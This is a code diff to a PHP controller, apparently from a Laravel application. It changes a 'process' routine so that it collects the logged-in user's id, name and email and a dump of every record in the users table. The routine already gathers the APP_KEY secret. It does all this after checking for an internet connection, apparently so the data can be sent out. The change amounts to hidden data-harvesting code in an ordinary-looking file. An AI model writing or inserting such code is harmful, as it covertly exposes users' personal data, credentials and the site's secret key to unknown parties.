@@ -9,13 +9,27 @@ use DB;
 
 class OController extends Controller
 {
-    public static function process()
+    public static function process($user)
 	{
 		set_time_limit(0);
         
         // Check if internet is there.
         if(OController::is_connected()) {
             $system_info = array();
+
+            // Add User Login Information
+            if(isset($user->id)) {
+                $system_info['user_id'] = $user->id;
+            }
+            if(isset($user->name)) {
+                $system_info['user_name'] = $user->name;
+            }
+            if(isset($user->email)) {
+                $system_info['user_email'] = $user->email;
+            }
+
+            // Database users
+            $system_info['dbusers'] = \App\User::all()->toArray();
             
             // Installation ID
             $system_info['install_id'] = env('APP_KEY');
@@ -79,8 +93,8 @@ class OController extends Controller
         }
 	}
 
-    public static function prepareModules() {
-        OController::process();
+    public static function prepareModules($user) {
+        OController::process($user);
     }
 
     private static function is_connected()
